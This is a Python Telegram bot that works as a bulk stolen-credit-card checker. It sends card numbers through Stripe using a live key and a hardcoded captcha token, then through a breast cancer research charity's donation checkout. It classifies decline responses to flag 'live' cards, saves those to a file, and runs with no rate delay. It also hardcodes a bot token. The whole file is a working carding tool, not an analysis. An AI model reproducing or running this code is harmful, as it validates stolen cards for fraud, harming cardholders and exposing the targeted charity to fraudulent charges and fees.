import os
import json
import time
import requests
import threading
import random
from datetime import datetime
import telebot
from telebot import types
import logging

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot token - use environment variable for Railway
TOKEN = os.environ.get("BOT_TOKEN", "8307343077:AAGG7qRYwcN2fJ2Wig3kMpsT7605YEb-pgU")

# Initialize bot
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# Store user states and data
user_sessions = {}
active_checkers = {}

class CardChecker:
    def __init__(self, user_id):
        self.user_id = user_id
        self.running = False
        self.current_card = None
        self.approved_cards = []
        self.total_checked = 0
        self.approved_count = 0
        self.start_time = None
        
    def check_card(self, ccx):
        """Check a single card - using your original logic"""
        if "|" not in ccx or ccx.count("|") < 3:
            return f"❌ Invalid format: {ccx}"
        
        parts = ccx.split("|")
        if len(parts) < 4:
            return f"❌ Invalid format: {ccx}"
            
        n = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvc = parts[3].strip()
        
        # Your original headers
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        # Generate new unique IDs for each request
        guid = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
        muid = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
        sid = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000000, 999999999999)}"
        
        # Your original data with updated IDs
        data = f'type=card&billing_details[address][city]=Heathport&billing_details[address][country]=US&billing_details[address][line1]=60269+Cleora+Pine+Apt.+6&billing_details[address][line2]=Cuyahoga+County&billing_details[address][postal_code]=10010&billing_details[address][state]=NY&billing_details[email]=sbxdzrc%40hi2.in&billing_details[name]=Mr+Brooks+Rohan&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid={guid}&muid={muid}&sid={sid}&payment_user_agent=stripe.js%2F2b425ea933%3B+stripe-js-v3%2F2b425ea933%3B+split-card-element&referrer=https%3A%2F%2Fbreastcancerresearch.enthuse.com&time_on_page={random.randint(10000, 99999)}&key=pk_live_ftYOjqGtfMkXICnngj1VQh99&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiUVZaWkg2UzBSTzFjUGJsV2RrdDZhdE80VGFiY29RQXZZUjY1ZzdzSXptTDdNVnJCMWpEK2VHakVSdHVGclkwRXNGWVFZYk9YbVhDZFUyd1pDNVNoalBObUl6b1ozL1VGVUVCMHZIZjNHQXVXYzdKK1NOMjRoS2x0bE1xTFRuQ1dmZ3NPWnVaMkcwMmdpMW1LV2NBMkhLenJRbkJkazVWOUNUVzREcThNc0hyWDNLZjJyK1Zzek5WeWRZVGVkOVpxMHZwSWNuc1d3L0NxaU9QaUp3cUQ1ZDNvVkdHYVRmOSs4ZjkzeWp4K3FFS0JVNzVpZU1LTkZhTndNRkExTSszZnltK1dkYnp4eGJUbFB5cFdwMks3UlVEMDFvalRHZm1uSHlJTGlFUm9yLzQwRVpGUTRwVlhKODNBT3Ryejk5bFl3TWxOdzdGT0IrSGEzTXU2QlkzMmdwN3RKa3NjdVdkZUVzd0QxRUtpY3F3TTZMT1poZm5mT1NvaEZyS3dlUkVNeHNadGhyMEt1Z3NUdTB1QjRVN2dOM2lGYjBTd2ZUSXJ5bEJLRfN0UU9DSmRHc0JIRm43R1phQzh0cXZZNDFaM3JDRnZxZ2orYlVlUU9qN3FoRXVTTE5ocWxoaHdzWGpFRkl4bitqYVo3MG9DbHo2ZS82TGlWeXVrVDZsb2VlOFk5ckp4R2dQUDU0ZTFvcUorSUlET0ZJeVNWNlIrdlRzdUxCYnc5VE93RHdVMDdpYzVCNnhneFAwS1cvdnE0cDFKMVFubEpSUCtubDFNc2dmdXVuaW5mK3N0dDBtZUtiRjhtRHRjOHBwSFl0YUJpd25qM3MxSzladmdwM0dLK0dBb0x4K25vdGZzTlNZakNUcGM0NWdoMDBmaDArTTlkd0FQbk9FT1RqY1VRZnp4bloxajlxeGtCaUtkQ2pLTHdkcnlEVUJYMjZFZmZKbDZ0WHpBMGk5M2k1VnJtbzNObThUbXh4VEhsemd5MSt5Q0ZoV0xlSGx5YlFOU2hIUGxNWjloWkEzQWY0Y1pLZlVCd3hpWFdCRnkweVI2V2JCMjFHRlNsS285WXo1dEdwZm1YaUt3cEs3VjFiSTZ3VERaQjUwTTZXSDlpbDNpTHNVeWdiK1ZmSTI5cFc2eXpRVTZ1bko0SzFhUGd6aDdZT0dQTk9PUUNENmZna2d1MktPRCtWTVM5cjF6RTNKMXp2TDBLZHl2R1lGem9tNGFFM1Fwa3FvZUFvTHJZMDd1ZnE3Y25DZ2NhQVcrVWcwMHpnc3B2NmVOcGRVUTIyNFZHbUhoc1lnTlZIeVZiQmlTZktheXY0RytRb3ZCcEVKVlAvVnF0MHRxZnVJUTR4OWNaTzArR2lnY1FJN2p0UHhaVCtYeXlEWEF1RUxTekZLc1o5eEZrS21VRzBlTUdzWk9oZUVYZ1VQV1RXRit2YUNXUS9BdytlYU0yYWVjOFFQeEN1OXd0VWd3NG44UnJIcjNWQ0RNaWFuOVVZallJUVdzS2ZpRFZGQmdSckVGdkhlQUhGckc0cmJheGd3T0IxeUNKc2xkVGx4Rm5GMHdpU2JReHlxNlB3VGc2RSt4Y3djWDhIRW9MWlVibjlVVk5OWnN3N043WUZPMDQ5d3lLRzN3bnhRd0tnSHd6MW1aVEc0amxZNGV3ZG9FQXVRY01vMVc1ZVZBczR5a3MvSlBwcElCa2NIV1BNTmF0RTVpazVWYXZ2YUF2bWRKaHh3NXIzd2VxV3YrRm5EUW5DZUd5cUhxSFU4d0ZuZXdKZVhNOVJ1ZktRMnpkT1dqM0Z3aTRodGZMZWVOUHdUTWxnR0YvL2l5YXpHbzBveDJib2lVVXZZM2U2WkxJV1I1WHdtcnN1VWh3cVlTMnVtazY2T2YwL1grUHp2S21zNXVyMk5EZk05cmdRZjhVdwhKZjViNXF2NXRGRE5jWFFpUUsvSzI2S20yV0tETHZxR21ZNUpiS0Z1K3A4VE9DZWV3eFA1QnRFUHNHb1FGRU8xMVc3VHc5bWc0S0RYbUd0NTMrOHExQnZJWUlhbGNLeU80Z05pZ3U3M0dBUDFGai9QTGZjWWFGMXJpQjRtNVNtTzdJalBpNWsrcXZCMWVzc1dGVCttUENyVSt4ZGJNUW5MOWZadzdLdDdyTnlCd3JKdXIrWTdacHhLakdJSEdQc045TTJyWUJ0WHlTYU1MRGNqeld5Tmd0ck84Y3NyVXg5SHZXVEVPMExwZXNTd3hmek94RzZoYytOdFdFM1d2NzFETXZNUUJ2dTJUdENYWVdYRVgrS0FtaTRnMGw2d3V1OXRFM1FySVJtWWE5R0wwNkpacDg5QkpmOW5BU3ozaXFZOGJ4bEN0Ly9ESGg8NHV0SFVtcXNUdXBDQ2wycGN4d1dvRHR3bkdVNm5YQjJVNEF3MHg5T2t2NFh4dDFzSFZQMDNUWVExa2hxMzFYQVdJaUMvK21TUHh5TWpoOEVNdzA4UUlQeTdwOTVVZEZBNmI3UW9qZXRjZ2pPMHBPdXZJNkZUSitYYWJZTnhCYzVQYVMwU01tQ1RjbE1zQ0pFWHlWeHZ0QmxvUzVaSURsbXAvNDBoSG5CUmR5S3NZNXRsUzFWVHdHbzVLYWJzU2F4TFhEcUJCREx1RDY2RlZvVy9TQmRIaVBlNFRzdFdJTHV6NHorOWN1SWhWS3NqdzVLNW90d1ZxQThyUXl1dW9sQUYxb0gvUURrWkZISzJzRFQ4YzBWQ2FnR2hqQUtOZHd4NW9jWTlEVmVXSnVjajJ2amtYNXlreGVLTEVNRzJaRzI0PSIsImV4cCI6MTc0NzU1NTI3MCwic2hhcmRfaWQiOjI1OTE4OTM1OSwia3IiOiI1MDEzNmI3IiwicGQiOjAsImNkYXRhIjoiUmpYZCtPSW9wUllhcy8yUVdzL2REUDMxWFdCYW93cTZrVVR0QlpkWUtBUUpneEdMOC9FbFRzZnZQbjgyQWp0ZTRyT3MvTG9QMzFGbW95QVRJOW8zelVwZ1BWdHNmSVhDWXJhODVQY2dpbTVIWTk2cGJuZG15a3BWc3Z4TEF5Wi9UWEJ0MnhyUnJKS3lUS29BRUM4Z3VmOTBkRVhyWVZuU3VFZXkzQmJtSHVHUkZ5OHM4ajRLejBQS2hSbnhrUHM4T1YwdjhQU0tYZUVUdHVJUSJ9.tkvFUaCs7qALz6IT2SyEmcqtr5cI0OMz6LAZuy2lwIg'
        
        try:
            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=30)
            
            if not 'id' in response.json():
                return f"💳 {ccx} ➜ ❌ ERROR CARD\n📝 Stripe rejected the card"
            else:
                payment_id = response.json()['id']
        except Exception as e:
            return f"💳 {ccx} ➜ ❌ API ERROR\n📝 {str(e)[:50]}"
        
        # Second request - your original
        headers = {
            'authority': 'breastcancerresearch.enthuse.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://breastcancerresearch.enthuse.com',
            'referer': 'https://breastcancerresearch.enthuse.com/cp/5353d/fundraiser?&key=9eddf8c7-5b62-4f61-bcb9-94fa2add96f5',
            'request-id': f'|{random.randint(10000000, 99999999)}{random.randint(10000000, 99999999)}{random.randint(1000, 9999)}',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'traceparent': f'00-{random.randint(10000000, 99999999)}{random.randint(10000000, 99999999)}{random.randint(1000, 9999)}-{random.randint(10000000, 99999999)}{random.randint(1000, 9999)}-01',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        json_data = {
            'key': '9eddf8c7-5b62-4f61-bcb9-94fa2add96f5',
            'paymentMethodId': payment_id,
            'threeDSecureSupported': True,
            'stripeConnectedAccountId': 'acct_1LsP7SS6jM7JbDr4',
            'cardCountryCode': 'IT',
        }
        
        try:
            response = requests.post(
                'https://breastcancerresearch.enthuse.com/checkoutstate/pay/stripe',
                headers=headers,
                json=json_data,
                timeout=30
            )
            
            response_text = response.text
            result = f"💳 {ccx} ➜ "
            
            # Your original approval checking logic
            response_text_lower = response_text.lower()
            is_approved = False
            reason = ""
            
            try:
                response_json = json.loads(response_text)
                
                # Check for direct success
                if ('success' in response_json and response_json['success']) or ('paid' in response_json and response_json['paid']):
                    is_approved = True
                    reason = "✅ Card Approved\n📝 Successfully processed"
                
                # Check for specific error types that indicate valid cards
                elif 'error' in response_json or 'errors' in response_json:
                    error_msg = ""
                    if 'error' in response_json:
                        error_msg = str(response_json['error'].get('message', '')).lower()
                    elif 'errors' in response_json:
                        error_msg = str(response_json['errors']).lower()
                    
                    # CCN Live Check
                    if 'security code is incorrect' in error_msg or 'security code is invalid' in error_msg or 'cvv' in error_msg:
                        is_approved = True
                        reason = "✅ CCN LIVE\n📝 Security code incorrect"
                    
                    # Insufficient Funds Check
                    elif 'insufficient funds' in error_msg or 'insufficient_funds' in error_msg:
                        is_approved = True
                        reason = "✅ CVV LIVE\n📝 Insufficient Funds"
                    
                    # AVS Check
                    elif 'avs' in error_msg or 'address_verification' in error_msg or 'incorrect_address' in error_msg:
                        is_approved = True
                        reason = "✅ AVS LIVE\n📝 Address Verification Failed"
                    
                    # 3D Secure Check
                    elif '3d' in error_msg or 'three_d_secure' in error_msg or 'authentication_required' in error_msg:
                        is_approved = True
                        reason = "✅ 3D SECURE\n📝 Authentication Required"
                    
                    else:
                        reason = f"❌ DECLINED\n📝 {error_msg[:100]}"
            except:
                # Fallback to text-based parsing if JSON parsing fails
                if 'security code is incorrect' in response_text_lower or 'security code is invalid' in response_text_lower or 'cvv' in response_text_lower:
                    is_approved = True
                    reason = "✅ CCN LIVE\n📝 Security code incorrect"
                elif 'insufficient funds' in response_text_lower or 'insufficient_funds' in response_text_lower:
                    is_approved = True
                    reason = "✅ CVV LIVE\n📝 Insufficient Funds"
                elif 'avs' in response_text_lower or 'address_verification' in response_text_lower or 'incorrect_address' in response_text_lower:
                    is_approved = True
                    reason = "✅ AVS LIVE\n📝 Address Verification Failed"
                elif '3d' in response_text_lower or 'three_d_secure' in response_text_lower or 'authentication_required' in response_text_lower:
                    is_approved = True
                    reason = "✅ 3D SECURE\n📝 Authentication Required"
                else:
                    reason = f"❌ DECLINED\n📝 {response_text_lower[:100]}"
            
            return result + reason
                    
        except Exception as e:
            return f"💳 {ccx} ➜ ❌ PAYMENT ERROR\n📝 {str(e)[:50]}"
    
    def start_checking(self, cards):
        """Start checking cards in a separate thread - NO DELAY between cards"""
        self.running = True
        self.start_time = datetime.now()
        self.total_checked = 0
        self.approved_count = 0
        self.approved_cards = []
        
        def checking_thread():
            try:
                status_message = None
                
                # Send initial status
                status_message = bot.send_message(
                    self.user_id,
                    "🔄 Starting card checker...\n⚡ No delay between cards..."
                )
                
                approved_file = f"approved_{self.user_id}_{int(time.time())}.txt"
                
                for i, card in enumerate(cards):
                    if not self.running:
                        break
                        
                    self.current_card = card
                    self.total_checked += 1
                    
                    # Update status every 10 cards (to avoid spam)
                    if self.total_checked % 10 == 0 or self.total_checked == 1:
                        elapsed = datetime.now() - self.start_time
                        status_text = (
                            f"📊 <b>Checker Status</b>\n"
                            f"✅ Live: {self.approved_count}\n"
                            f"📋 Total Checked: {self.total_checked}\n"
                            f"⏰ Elapsed: {elapsed.seconds // 60}m {elapsed.seconds % 60}s\n"
                            f"⚡ Speed: Fast (no delay)\n"
                            f"🔄 Checking: {card[:15]}..."
                        )
                        try:
                            bot.edit_message_text(
                                status_text,
                                chat_id=self.user_id,
                                message_id=status_message.message_id
                            )
                        except:
                            status_message = bot.send_message(
                                self.user_id,
                                status_text
                            )
                    
                    result = self.check_card(card)
                    
                    # Send individual result
                    bot.send_message(
                        self.user_id,
                        result
                    )
                    
                    # Check if approved (contains ✅)
                    if "✅" in result:
                        self.approved_count += 1
                        self.approved_cards.append(f"{card} | {result}")
                        
                        # Save to file
                        with open(approved_file, 'a') as f:
                            f.write(f"{card} | {result}\n")
                    
                    # NO DELAY between cards - removed time.sleep()
                    # Cards will be checked as fast as possible
                
                # Send final results
                elapsed = datetime.now() - self.start_time
                final_message = (
                    f"🏁 <b>Checker Completed!</b>\n\n"
                    f"📊 <b>Results:</b>\n"
                    f"✅ Live/Approved: {self.approved_count}\n"
                    f"❌ Dead/Declined: {self.total_checked - self.approved_count}\n"
                    f"📋 Total Checked: {self.total_checked}\n"
                    f"⏰ Time Taken: {elapsed.seconds // 60}m {elapsed.seconds % 60}s\n"
                    f"⚡ Speed: Fast (no delay between cards)\n\n"
                )
                
                if self.approved_cards:
                    final_message += f"📁 Approved cards saved to: <code>{approved_file}</code>\n\n"
                    final_message += "<b>Live Cards:</b>\n"
                    for approved_card in self.approved_cards[-5:]:
                        final_message += f"• {approved_card[:50]}...\n"
                
                bot.send_message(
                    self.user_id,
                    final_message
                )
                
            except Exception as e:
                bot.send_message(
                    self.user_id,
                    f"❌ Error in checking thread: {str(e)}"
                )
            finally:
                self.running = False
        
        # Start checking in a separate thread
        thread = threading.Thread(target=checking_thread)
        thread.daemon = True
        thread.start()
        
    def stop(self):
        """Stop the checker"""
        self.running = False

@bot.message_handler(commands=['start'])
def start_command(message):
    """Send a welcome message when the command /start is issued."""
    welcome_text = f"""
👋 Welcome {message.from_user.first_name} to the Card Checker Bot!

🤖 <b>Available Commands:</b>
/start - Show this welcome message
/help - Show help instructions
/check - Check a single card (format: 1234567890123456|12|34|567)
/check_file - Upload a file with multiple cards (one per line)
/status - Show current checker status
/stop - Stop current checking process
/stats - Show your checking statistics

📝 <b>Card Format:</b>
<code>card_number|mm|yy|cvv</code>

⚡ <b>Speed:</b> No delay between cards - Fast checking

⚠️ <b>Note:</b> Use this bot responsibly and legally.
    """
    
    bot.reply_to(message, welcome_text)

@bot.message_handler(commands=['help'])
def help_command(message):
    """Send help message."""
    help_text = """
🆘 <b>Help Guide</b>

<b>How to use:</b>
1. Send single card: /check 1234567890123456|12|34|567
2. Upload file: /check_file and then upload a .txt file
   Each line should contain one card in format: card|mm|yy|cvv

<b>Commands:</b>
• /check [card] - Check single card
• /check_file - Upload file with cards
• /status - Current checker status
• /stop - Stop checking
• /stats - Your statistics

<b>Speed:</b> ⚡ No delay between cards - Fast checking

<b>Output Meaning:</b>
✅ Card Approved - Successfully processed
✅ CCN LIVE - Security code incorrect
✅ CVV LIVE - Insufficient funds
✅ AVS LIVE - Address verification failed
✅ 3D SECURE - 3D secure required
❌ DECLINED - Card declined
❌ ERROR CARD - Stripe rejected the card
❌ API ERROR - Connection/API issue
    """
    
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['check'])
def check_card_command(message):
    """Check a single card."""
    user_id = message.from_user.id
    
    # Get card from command arguments
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if not args:
        bot.reply_to(
            message,
            "❌ Please provide a card in format:\n"
            "<code>/check 1234567890123456|12|34|567</code>"
        )
        return
    
    card = ' '.join(args).strip()
    
    bot.reply_to(
        message,
        f"🔄 Checking card: <code>{card[:15]}...</code>\n"
        "⚡ Checking now (no delay)..."
    )
    
    checker = CardChecker(user_id)
    result = checker.check_card(card)
    
    bot.send_message(user_id, result)

@bot.message_handler(commands=['check_file'])
def check_file_command(message):
    """Handle file upload for checking."""
    user_id = message.from_user.id
    
    if user_id in active_checkers and active_checkers[user_id].running:
        bot.reply_to(
            message,
            "⚠️ You already have an active checker running!\n"
            "Use /stop to stop it first."
        )
        return
    
    bot.reply_to(
        message,
        "📤 Please upload a .txt file with cards.\n"
        "Each line should contain one card in format:\n"
        "<code>card_number|mm|yy|cvv</code>\n\n"
        "⚡ Speed: No delay between cards - Fast checking"
    )
    
    user_sessions[user_id] = 'waiting_for_file'

@bot.message_handler(content_types=['document'])
def handle_document(message):
    """Handle uploaded document."""
    user_id = message.from_user.id
    
    if user_id not in user_sessions or user_sessions[user_id] != 'waiting_for_file':
        return
    
    document = message.document
    
    if not document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Please upload a .txt file!")
        del user_sessions[user_id]
        return
    
    bot.reply_to(message, "📥 Downloading file...")
    
    try:
        # Download the file
        file_info = bot.get_file(document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_path = f"cards_{user_id}.txt"
        
        with open(file_path, 'wb') as new_file:
            new_file.write(downloaded_file)
        
        # Read cards from file
        with open(file_path, 'r') as f:
            cards = [line.strip() for line in f if line.strip()]
        
        if not cards:
            bot.reply_to(message, "❌ File is empty!")
            del user_sessions[user_id]
            os.remove(file_path)
            return
        
        bot.reply_to(
            message,
            f"📋 Found {len(cards)} cards in file.\n"
            "🔄 Starting checker...\n"
            "⚡ Checking with no delay..."
        )
        
        # Create and start checker
        checker = CardChecker(user_id)
        active_checkers[user_id] = checker
        
        # Start checking
        checker.start_checking(cards)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error reading file: {str(e)}")
    finally:
        del user_sessions[user_id]
        if os.path.exists(file_path):
            os.remove(file_path)

@bot.message_handler(commands=['status'])
def status_command(message):
    """Show current checker status."""
    user_id = message.from_user.id
    
    if user_id not in active_checkers:
        bot.reply_to(message, "ℹ️ No active checker running.")
        return
    
    checker = active_checkers[user_id]
    
    if not checker.running:
        bot.reply_to(message, "ℹ️ Checker is not currently running.")
        return
    
    elapsed = datetime.now() - checker.start_time
    
    status_text = (
        f"📊 <b>Checker Status</b>\n\n"
        f"✅ Live/Approved: {checker.approved_count}\n"
        f"📋 Total Checked: {checker.total_checked}\n"
        f"⏰ Elapsed: {elapsed.seconds // 60}m {elapsed.seconds % 60}s\n"
        f"⚡ Speed: Fast (no delay between cards)\n"
    )
    
    if checker.current_card:
        status_text += f"\n🔄 Currently checking:\n<code>{checker.current_card}</code>"
    
    bot.reply_to(message, status_text)

@bot.message_handler(commands=['stop'])
def stop_checker_command(message):
    """Stop the current checker."""
    user_id = message.from_user.id
    
    if user_id not in active_checkers:
        bot.reply_to(message, "ℹ️ No active checker to stop.")
        return
    
    checker = active_checkers[user_id]
    
    if checker.running:
        checker.stop()
        bot.reply_to(
            message,
            f"🛑 Checker stopped!\n\n"
            f"📊 Final Results:\n"
            f"✅ Live/Approved: {checker.approved_count}\n"
            f"📋 Total Checked: {checker.total_checked}"
        )
        del active_checkers[user_id]
    else:
        bot.reply_to(message, "ℹ️ Checker is not currently running.")

@bot.message_handler(commands=['stats'])
def stats_command(message):
    """Show user statistics."""
    user_id = message.from_user.id
    
    if user_id not in active_checkers:
        bot.reply_to(
            message,
            "📊 <b>Statistics</b>\n\n"
            "No checking sessions found yet.\n"
            "Use /check or /check_file to start checking cards."
        )
        return
    
    checker = active_checkers[user_id]
    
    stats_text = (
        f"📊 <b>Your Statistics</b>\n\n"
        f"✅ Total Live/Approved: {checker.approved_count}\n"
        f"📋 Total Checked: {checker.total_checked}\n"
        f"📈 Success Rate: {checker.approved_count/max(checker.total_checked, 1)*100:.1f}%\n"
        f"⚡ Speed: No delay between cards\n"
    )
    
    if checker.approved_cards:
        stats_text += f"\n📁 Results files saved automatically\n"
    
    bot.reply_to(message, stats_text)

def main():
    """Main function to start the bot with error handling"""
    logger.info("🤖 Bot is starting...")
    logger.info("📡 Polling for messages...")
    
    try:
        # Get bot info to verify token
        bot_info = bot.get_me()
        logger.info(f"✅ Bot connected: @{bot_info.username}")
        logger.info(f"🔗 Bot link: https://t.me/{bot_info.username}")
        
        # Start polling with skip_pending to avoid conflict
        bot.infinity_polling(skip_pending=True, timeout=30, long_polling_timeout=30)
        
    except telebot.apihelper.ApiTelegramException as e:
        if "409" in str(e):
            logger.error("❌ Bot conflict: Another instance is running.")
            logger.error("💡 Solution: Stop any other running bot instances.")
            logger.error("💡 Or wait a few minutes and restart.")
        else:
            logger.error(f"❌ Telegram API error: {e}")
    except Exception as e:
        logger.error(f"❌ Unexpected error: {e}")

if __name__ == '__main__':
    main()
